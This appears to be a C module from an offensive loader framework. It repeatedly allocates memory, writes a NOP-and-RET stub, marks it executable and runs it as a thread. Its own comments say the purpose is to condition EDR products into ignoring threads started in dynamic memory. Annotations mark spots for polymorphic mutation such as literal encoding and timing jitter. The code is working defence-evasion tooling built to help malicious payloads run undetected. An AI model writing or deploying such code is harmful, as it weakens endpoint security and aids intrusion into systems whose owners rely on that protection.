/* MODULE: DECONDITIONER
 * TYPE: thread_alloc
 * DESC: Alloc(RW) → Write benign code → Protect(RX) → CreateThread → Wait → Free.
 *       Normalizes thread creation from unbacked memory regions. EDRs heavily
 *       flag CreateThread where the start address is in a VirtualAlloc'd region
 *       rather than in a PE image section. Running this DECON_ROUNDS times
 *       establishes a baseline of "this process creates threads in dynamic memory."
 *
 * MUTATIONS: loop_mutation, literal_encoding, loop_restructuring, timing_jitter
 */
#include "../header/definitions.h"

#ifndef DECON_ROUNDS
#define DECON_ROUNDS 15
#endif

void deconditioner() {
    DWORD old_prot;

    // @MUTATE:loop_mutation(fixed->GetTickCount_modulo)
    // @MUTATE:loop_restructuring(for->while|unroll)
    for (int i = 0; i < DECON_ROUNDS; i++) {

        // @MUTATE:api_wrapper_injection(VirtualAlloc)
        // @MUTATE:literal_encoding
        char *buf = (char*)VirtualAlloc(NULL, PAYLOAD_LEN, 0x3000, p_RW);
        if (!buf) continue;

        // Write benign thread body: NOP sled + RET
        // @MUTATE:literal_encoding
        for (int k = 0; k < PAYLOAD_LEN - 1; k++) {
            buf[k] = (char)0x90;  // NOP
        }
        buf[PAYLOAD_LEN - 1] = (char)0xC3;  // RET

        // @MUTATE:timing_jitter
        // @MUTATE:api_wrapper_injection(VirtualProtect)
        if (!VirtualProtect(buf, PAYLOAD_LEN, p_RX, &old_prot)) {
            VirtualFree(buf, 0, 0x8000);
            continue;
        }

        // Create thread in dynamic memory — the exact pattern EDRs flag
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);
        if (hThread) {
            // @MUTATE:literal_encoding
            WaitForSingleObject(hThread, 5000);
            CloseHandle(hThread);
        }

        // @MUTATE:timing_jitter
        // @MUTATE:literal_encoding
        VirtualFree(buf, 0, 0x8000);
    }
}
